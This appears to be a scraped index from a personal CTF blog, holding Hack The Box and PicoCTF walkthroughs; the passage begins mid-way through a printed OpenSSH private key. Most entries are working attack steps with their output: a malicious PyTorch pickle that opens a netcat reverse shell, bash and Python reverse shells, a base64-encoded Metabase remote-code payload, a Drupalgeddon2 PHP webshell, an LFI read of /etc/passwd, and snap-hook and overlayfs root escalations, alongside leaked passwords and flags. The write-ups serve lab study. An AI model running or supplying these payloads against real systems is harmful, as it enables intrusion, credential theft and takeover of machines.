KEY-----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-----END OPENSSH PRIVATE KEY-----Copy it and store it in some file that you will use to connect with ssh:nano rsa &lt;&lt; the OPENSSH keythen connect to ssh:$ ssh -i rsa jippity@10.10.11.19And you will get the connection.$ sudo -lMatching Defaults entries for jippity on blurry: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jippity may run the following commands on blurry: (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pthThis is the thing you can do without sudo.On the machine there is script.pythat you will be needing to get the root shellbut you need to modify it a bit:$ cat script.pyimport torchimport torch.nn as nnimport osclass MaliciousModel(nn.Module): # PyTorch's base class for all neural network modules def __init__(self): super(MaliciousModel, self).__init__() self.dense = nn.Linear(10, 1) # Define how the data flows through the model def forward(self, turi): # Passes input through the linear layer. return self.dense(turi) # Overridden __reduce__ Method def __reduce__(self): cmd = \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.47 4444 &gt;/tmp/f\" return os.system, (cmd,)# Create an instance of the modelmalicious_model = MaliciousModel()# Save the model using torch.savetorch.save(malicious_model, 'help.pth') The IP and The port You want to get connection on. At the end as what name do you want program to save the file. From turi.pth-&gt; help.pth.Run the script and copy it to /models/directory for it to work. $ python3 script.py$ cp help.pth /models/ In other terminal start nc -nlvp 4444and then in sshterminal run the code: $ /usr/bin/evaluate_model /models/help.pth And then you will get the connection on NetCatas root: # cat /root/root.txtb975dc3b2ca5a27ebe1c1ee3e391ce98 root flag: b975dc3b2ca5a27ebe1c1ee3e391ce98*** " }, { "title": "bbbbloat from PicoCTF", "url": "/posts/Bbbbloat-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "bbbbloat from PicoCTFpage DescriptionCan you get the flag? Reverse engineer this binary.Download it and we see that this file type is ELF. Ghidra supports it so we reverse engineer it in Ghidra.giorgi@darkfears31:~/Desktop$ chmod +x bbbbloat giorgi@darkfears31:~/Desktop$ ./bbbbloat What's my favorite number? 4422Sorry, that's not it!In Ghidra we search for function that has this text “What’s my favorite number?” in main function. And Voila in Decompiler we see this:undefined8 FUN_00101307(void){ long in_FS_OFFSET; int local_48; undefined4 local_44; char *local_40; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); local_38 = 0x4c75257240343a41; local_30 = 0x3062396630664634; local_28 = 0x65623066635f3d33; local_20 = 0x4e326560623535; local_44 = 0xd2c49; printf(\"What\\'s my favorite number? \"); local_44 = 0xd2c49; __isoc99_scanf(&amp;DAT_00102020,&amp;local_48); local_44 = 0xd2c49; if (local_48 == 0x86187) { local_44 = 0xd2c49; local_40 = (char *)FUN_00101249(0,&amp;local_38); fputs(local_40,stdout); putchar(10); free(local_40); } else { puts(\"Sorry, that\\'s not it!\"); } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0;}If we inspect that IF statement below the printf(“What's my favorite number? “); we see thatif (local_48 == 0x86187) Local_48 is in hexadecimals and right beside to it there is Decimal number:549255giorgi@darkfears31:~/Desktop$ ./bbbbloat What's my favorite number? 549255picoCTF{cu7_7h3_bl047_36dd316a}" }, { "title": "Backdoor from HTB", "url": "/posts/Backdoor-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Backdoor from HTBnmapgave this:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)|_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Backdoor &amp;#8211; Real-Life|_http-server-header: Apache/2.4.41 (Ubuntu)1337/tcp open waste?accessing the site we see that it’s running on wordpress you can scan plugins with wpscanand also can see it if it is not hidden in /wp-content/pluginsThere you will see ebook-download. This means ebook-downloadis usedAccess that plugin and in readme.txtthere is version of that plugin 1.1 which is exploitable LFIsee what users are therecurl 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd'/etc/passwd/etc/passwd/etc/passwdroot:x:0:0:root:/root:/bin/bashuser:x:1000:1000:user:/home/user:/bin/bash&lt;script&gt;window.close()&lt;/script&gt;learn what is running on 1337 port with /proc/{PID}/cmdlinefor i in $(seq 0 1000); do curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/${i}/cmdline;done &gt; pid-enum# 20 minutes after&lt;/script&gt;/proc/818/cmdline/proc/818/cmdline/proc/818/cmdline/bin/sh-cwhile true;do su user -c \"cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\"; done&lt;script&gt;window.close()This means on 1337port gdb-serveris running exploithttps://www.exploit-db.com/exploits/50539we’ll use msfdb$ sudo msfdb runmsf6 &gt; search gdbMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/gdb/gdb_server_exec 2014-08-24 great No GDB Server Remote Payload Execution 1 \\_ target: x86 . . . . 2 \\_ target: x86_64 . . . . 3 \\_ target: ARMLE . . . . 4 \\_ target: AARCH64 . . . . 5 exploit/linux/local/ptrace_sudo_token_priv_esc 2019-03-24 excellent Yes ptrace Sudo Token Privilege EscalationInteract with a module by name or index. For example info 5, use 5 or use exploit/linux/local/ptrace_sudo_token_priv_escmsf6 &gt; use 0[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcpmsf6 exploit(multi/gdb/gdb_server_exec) &gt; set LHOST tun0LHOST =&gt; tun0msf6 exploit(multi/gdb/gdb_server_exec) &gt; set LPORT 1234LPORT =&gt; 1234msf6 exploit(multi/gdb/gdb_server_exec) &gt; set RHOSTS 10.10.11.125RHOSTS =&gt; 10.10.11.125msf6 exploit(multi/gdb/gdb_server_exec) &gt; set RPORT 1337RPORT =&gt; 1337msf6 exploit(multi/gdb/gdb_server_exec) &gt; set payload payload/linux/x64/shell_reverse_tcppayload =&gt; linux/x64/shell_reverse_tcpmsf6 exploit(multi/gdb/gdb_server_exec) &gt; set target 1target =&gt; 1msf6 exploit(multi/gdb/gdb_server_exec) &gt; run[*] Started reverse TCP handler on 10.10.16.6:1234[*] 10.10.11.125:1337 - Performing handshake with gdbserver...[*] 10.10.11.125:1337 - Stepping program to find PC...[*] 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103...[*] 10.10.11.125:1337 - Executing the payload...[*] Command shell session 1 opened (10.10.16.6:1234 -&gt; 10.10.11.125:54886) at 2024-08-21 02:10:26 +0400lsuser.txtbash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.6/4444 0&gt;&amp;1' # to get reverse shellUser Flag is: 6527b58e718c5bd7587f743d81d177fd***$ ps -auxroot 818 0.0 0.0 2608 1632 ? Ss 20:27 0:00 /bin/sh -c while true;do su user -c \"cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;\"; doneroot 822 0.0 0.0 2608 1604 ? Ss 20:27 0:01 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \\;; donewith that we assume that screen named rootis already running so let’s simply attach to it:screen -r root/ #tap enter twiceroot@Backdoor:~#" }, { "title": "BabyEncryption from HTB", "url": "/posts/BabyEncryption-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "BabyEncryption from HackTheBoxpage DescriptionYou are after an organised crime group which is responsible for the illegal weapon market in your country. As a secret agent, you have infiltrated the group enough to be included in meetings with clients. During the last negotiation, you found one of the confidential messages for the customer. It contains crucial information about the delivery. Do you think you can decrypt it?There is two files. First chall.pywhich encrypts the text and second the encrypted text.$ cat chall.py import stringfrom secret import MSGdef encryption(msg): ct = [] for char in msg: ct.append((123 * char + 18) % 256) return bytes(ct)ct = encryption(MSG)f = open('./msg.enc','w')f.write(ct.hex())f.close()$ cat msg.enc 6e0a9372ec49a3f6930ed8723f9df6f6720ed8d89dc4937222ec7214d89d1e0e352ce0aa6ec82bf622227bb70e7fb7352249b7d893c493d8539dec8fb7935d490e7f9d22ec89b7a322ec8fd80e7f8921So we have to reverse the encryption. I don’t have knowledge of coding so i went to chatgptand got this code:$ cat ll.py def decryption(ct): msg = [] mod_inv_123 = pow(123, -1, 256) # Precompute the modular inverse of 123 mod 256 for byte in ct: original_char = chr(((byte - 18) * mod_inv_123) % 256) # Calculate the original character msg.append(original_char) return ''.join(msg)# Read the encrypted hex string from the filewith open('msg.enc', 'r') as f: hex_string = f.read().strip() # Ensure no extra whitespace is read# Convert the hex string back to bytesct_bytes = bytes.fromhex(hex_string)# Decrypt the messagedecrypted_msg = decryption(ct_bytes)print(decrypted_msg)I ran it and got the flag:$ python3 ll.py Th3 nucl34r w1ll 4rr1v3 0n fr1d4y.HTB{l00k_47_y0u_r3v3rs1ng_3qu4710n5_c0ngr475}HTB{l00k_47_y0u_r3v3rs1ng_3qu4710n5_c0ngr475}" }, { "title": "Armageddon from HTB", "url": "/posts/Armageddon-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Armageddon from HTBnmap scan shows thisPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:| 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)| 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)|_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)|_http-title: Welcome to Armageddon | Armageddon| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt|_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16|_http-generator: Drupal 7 (http://drupal.org)Site runs on Drupal 7use this scriptsearchsploit -m php/webapps/44449.rbruby drupalgeddon2.rb -h&lt;internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb&gt;:86:in `require': cannot load such file -- highline/import (LoadError)\tfrom &lt;internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb&gt;:86:in `require'\tfrom drupalgeddon2.rb:16:in `&lt;main&gt;'This gave error so we have to install highlinefor rubysudo gem install highlineFetching highline-3.1.1.gemSuccessfully installed highline-3.1.1Parsing documentation for highline-3.1.1Installing ri documentation for highline-3.1.1Done installing documentation for highline after 4 seconds1 gem installedthen run the scriptruby drupalgeddon2.rb http://10.10.10.233[*] --==[::#Drupalggedon2::]==----------------------------------------------------------------------------------[i] Target : http://10.10.10.233/--------------------------------------------------------------------------------[+] Found : http://10.10.10.233/CHANGELOG.txt (HTTP Response: 200)[+] Drupal!: v7.56--------------------------------------------------------------------------------[*] Testing: Form (user/password)[+] Result : Form valid- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -[*] Testing: Clean URLs[!] Result : Clean URLs disabled (HTTP Response: 404)[i] Isn't an issue for Drupal v7.x--------------------------------------------------------------------------------[*] Testing: Code Execution (Method: name)[i] Payload: echo DOKXJFEJ[+] Result : DOKXJFEJ[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!--------------------------------------------------------------------------------[*] Testing: Existing file (http://10.10.10.233/shell.php)[i] Response: HTTP 404 // Size: 5- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -[*] Testing: Writing To Web Root (./)[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php[+] Result : &lt;?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2&gt;&amp;1' ); }[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!--------------------------------------------------------------------------------[i] Fake PHP shell: curl 'http://10.10.10.233/shell.php' -d 'c=hostname'armageddon.htb&gt;&gt;to get proper reverse shellyou will needpython3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.10.233 - - [01/Sep/2024 21:57:06] \"GET /reverse.sh HTTP/1.1\" 200 - rlwrap nc -nvlp 443listening on [any] 443 ...connect to [10.10.16.3] from (UNKNOWN) [10.10.10.233] 34088bash: no job control in this shellbash-4.2$in /var/www/html/sites/default/settings.phpwe find this:$databases = array ( 'default' =&gt; array ( 'default' =&gt; array ( 'database' =&gt; 'drupal', 'username' =&gt; 'drupaluser', 'password' =&gt; 'CQHEy@9M*m23gBVj', 'host' =&gt; 'localhost', 'port' =&gt; '', 'driver' =&gt; 'mysql', 'prefix' =&gt; '', ), ),);Let’s check out mysql databasesbash-4.2$ mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;'sers;'-u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from uuid\tname\tpass\tmail\ttheme\tsignature\tsignature_format\tcreated\taccess\tlogin\tstatus\ttimezone\tlanguage\tpicture\tinit\tdata0\t\t\t\t\t\tNULL\t0\t0\t0\t0\tNULL\t\t0\t\tNULL1\tbrucetherealadmin\t$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt\tadmin@armageddon.eu\t\t\tfiltered_html\t1606998756\t1607077194\t1607076276\t1\tEurope/London\t\t0\tadmin@armageddon.eu\ta:1:{s:7:\"overlay\";i:1;}Found this now crack the passwordhashid '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'[+] Drupal &gt; v7.xhashcat --help | grep Drupal 7900 | Drupal7hashcat hash /usr/share/wordlists/rockyou.txt -m 7900 Username brucetherealadminPassword boobooNow connect to sshssh brucetherealadmin@10.10.10.233Warning: Permanently added '10.10.10.233' (ED25519) to the list of known hosts.[brucetherealadmin@armageddon ~]$ iduid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin)User Flag is: d37fd1ab216523d7803ec1665f41b272***to do privilege escalation we use this https://gtfobins.github.io/gtfobins/snap/$ sudo gem install --no-document fpm$ COMMAND=id cd $(mktemp -d) mkdir -p meta/hooks printf '#!/bin/sh\\n%s; false' \"$COMMAND\" &gt;meta/hooks/install chmod +x meta/hooks/install fpm -n xxxx -s dir -t snap -a all meta Created package {:path=&gt;\"xxxx_1.0_all.snap\"}then transfer that to machinesudo snap install test.snap --dangerous --devmodeerror: cannot perform the following tasks:- Run install hook of \"xxxx\" snap if present (run hook \"install\": uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0)We have root IDso now lets change it a bitCOMMAND=\"chown root:root /home/brucetherealadmin/bash;chmod 4755 /home/brucetherealadmin/bash\"cd $(mktemp -d)mkdir -p meta/hooksprintf '#!/bin/sh\\n%s; false' \"$COMMAND\" &gt;meta/hooks/installchmod +x meta/hooks/installfpm -n xxxx -s dir -t snap -a all metatransfer it and execute the same way$ sudo snap install privilege.snap --dangerous --devmode$ ls -la-rwsr-xr-x. 1 root root 964536 Sep 2 09:51 bash$ ./bash -pbash-4.2# iduid=1000(brucetherealadmin) gid=1000(brucetherealadmin) euid=0(root) groups=1000(brucetherealadmin)Root Flag is: 694195fd5d417ef2f7903ae2bd65f044***" }, { "title": "Antique from HTB", "url": "/posts/Antique-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Antique from HTBnmapgave thisnmap -sC --min-rate=4000 -T4 10.10.11.107 -PnPORT STATE SERVICE23/tcp open telnet-------------------------------------------------------sudo nmap -sU --min-rate=4000 -T4 10.10.11.107 -PnPORT STATE SERVICE161/udp open snmp------------------------------------------------------- sudo nmap -sU -sV --min-rate=4000 -T4 10.10.11.107 -p 161PORT STATE SERVICE VERSION161/udp open snmp SNMPv1 server (public)the (public)means that we can use snmpwalkon itsnmpwalk -v 1 -c public 10.10.11.107iso.3.6.1.2.1 = STRING: \"HTB Printer\"I got nothing more from snmpwalktelnet 10.10.11.107Trying 10.10.11.107...Connected to 10.10.11.107.Escape character is '^]'.HP JetDirectPassword: adminInvalid passwordConnection closed by foreign host.Searching HP JedDirectgot me somethinghttps://www.irongeek.com/i.php?page=security/networkprinterhackingHere is an exploit with snmpgetwhich we can use and it will give us hexed passowrdsnmpget -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 3233 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135This is hexand decode it to get password. Go to CyberChefand use From HexP@ssw0rd@123!!123We got The password, go to telnetand connect with this password: P@ssw0rd@123!!123&gt; ?To Change/Configure Parameters Enter:Parameter-name: value &lt;Carriage Return&gt;Parameter-name Type of valueip: IP-address in dotted notationsubnet-mask: address in dotted notation (enter 0 for default)default-gw: address in dotted notation (enter 0 for default)syslog-svr: address in dotted notation (enter 0 for default)idle-timeout: seconds in integersset-cmnty-name: alpha-numeric string (32 chars max)host-name: alpha-numeric string (upper case only, 32 chars max)dhcp-config: 0 to disable, 1 to enableallow: &lt;ip&gt; [mask] (0 to clear, list to display, 10 max)addrawport: &lt;TCP port num&gt; (&lt;TCP port num&gt; 3000-9000)deleterawport: &lt;TCP port num&gt;listrawport: (No parameter required)exec: execute system commands (exec id)exit: quit from telnet sessionthe execcan execute normal commands so let’s try to get shell with python.https://www.revshells.com/use pythononesthis got me connectionexec python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.16.7\",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'User Flag is: 577f8cdadeb1458074f296c3de434610***ss -tlnpLISTEN 0 4096 127.0.0.1:631 0.0.0.0:*lets see what is on 631port with curlcurl 127.0.0.1:631&lt;H1&gt;CUPS 1.6.1&lt;/H1&gt;We can find exploit for this on github https://github.com/p1ckzi/CVE-2012-5519/blob/main/cups-root-file-read.shwhich if we download on remote machine and execute we can read root flag or /etc/shadowwget 10.10.16.7:8001/ragaca.shchmod +x ragaca.shecho '/root/root.txt' | ./cups-root-file-read.shRoot Flag is: 4985b7a44209c17f0eda5d61862a966c***" }, { "title": "Analytics from HTB", "url": "/posts/Analytics-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Analytics from HTBpagenmapgave this: nmap -sCV 10.10.11.233 PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Analytical|_http-server-header: nginx/1.18.0 (Ubuntu)Nothing unusual.I added site address to /etc/hosts:10.10.11.233 analytical.htbI went to the site and i pressed loginwhich led me to different subdomain and i added it to /etc/hoststo access it:10.10.11.233 data.analytical.htbIt led me to login pageand it was metabase. To discover the version of metabasei used curland grep:curl http://data.analytical.htb/ | grep version..............\"version\":{\"date\":\"2023-06-29\",\"tag\":\"v0.46.6\",.............Then went to search for Exploit and found this site:https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646First we need token, i used curl and grep again:curl http://data.analytical.htb/auth/api/setup/validate | grep token........................token\":\"249fa03d-fd94-4d5b-b94f-b4ebf3df681f\"......................I copied the payload on The link above for reverse shell and i sent the payload in Burpsuite:POST /api/setup/validate HTTP/1.1Host: data.analytical.htbContent-Length: 816Accept: application/jsonUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Content-Type: application/jsonSec-GPC: 1Accept-Language: en-US,en;q=0.6Origin: http://data.analytical.htbReferer: http://data.analytical.htb/auth/login?redirect=%2FAccept-Encoding: gzip, deflate, brCookie: metabase.DEVICE=c4db9e82-ac15-462e-9258-c2018034f04aConnection: keep-alive{ \"token\": \"249fa03d-fd94-4d5b-b94f-b4ebf3df681f\", \"details\": { \"is_on_demand\": false, \"is_full_sync\": false, \"is_sample\": false, \"cache_ttl\": null, \"refingerprint\": false, \"auto_run_queries\": true, \"schedules\": {}, \"details\": { \"db\": \"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}')\\n$$--=x\", \"advanced-options\": false, \"ssl\": true }, \"name\": \"an-sec-research-team\", \"engine\": \"h2\" }}YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjIvMTIzNCAwPiYxis base64encoded payload:bash -i &gt;&amp;/dev/tcp/10.10.16.2/1234 0&gt;&amp;1. Paste that in the payload, start NetCat on port 1234and You will get the connection: rlwrap nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.2] from (UNKNOWN) [10.10.11.233] 46884bash: cannot set terminal process group (1): Not a ttybash: no job control in this shell566446a9a35c:/$I couldn’t activate shell here so i went to search for something. I’m not an user. Can’t find flag. I used envcommand and found this: envSHELL=/bin/shMB_DB_PASS=HOSTNAME=566446a9a35cLANGUAGE=en_US:enMB_JETTY_HOST=0.0.0.0JAVA_HOME=/opt/java/openjdkMB_DB_FILE=//metabase.db/metabase.dbPWD=/metabase.dbLOGNAME=metabaseMB_EMAIL_SMTP_USERNAME=HOME=/home/metabaseLANG=en_US.UTF-8META_USER=metalyticsMETA_PASS=An4lytics_ds20223#MB_EMAIL_SMTP_PASSWORD=USER=metabaseSHLVL=4MB_DB_USER=FC_LANG=en-USLD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../libLC_CTYPE=en_US.UTF-8MB_LDAP_BIND_DN=LC_ALL=en_US.UTF-8MB_LDAP_PASSWORD=PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binMB_DB_CONNECTION_URI=JAVA_VERSION=jdk-11.0.19+7_=/usr/bin/envOLDPWD=/I got the credentials: Username metalytics Password An4lytics_ds20223#I then went to sshand got the connection.ssh metalytics@10.10.11.233Password: An4lytics_ds20223#metalytics@analytics:~$ lsuser.txtmetalytics@analytics:~$ cat user.txt142306c920c6a937dad19b17c8b70c06User Flag: 142306c920c6a937dad19b17c8b70c06***I can’t run anything with root permission: sudo -l Sorry, user metalytics may not run sudo on localhost.envcommand gave me nothing. Then i went for searching exploits. And with uname -rversion of kernel was exploitable.Eventually i got to this site:https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/ which game me code for privilege escalation:unshare -rm sh -c \"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\\\"bash\")'\"Run this command to become rootbut wait you are not true root :D.After you become the fake rootyou need to run this commands one by one:rm -r l m u wmkdir exploitcd exploitmkdir l w u mcp /usr/bin/python3 l/setcap cap_setuid+eip l/python3mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w mtouch m/*u/python3&gt;&gt;&gt; import os&gt;&gt;&gt; os.setuid(0)&gt;&gt;&gt; os.system(\"bash\")root@analytics:~# cat /root/root.txtff608ad0bf165bcccd6516b9bf5ef8d1Root Flag is: 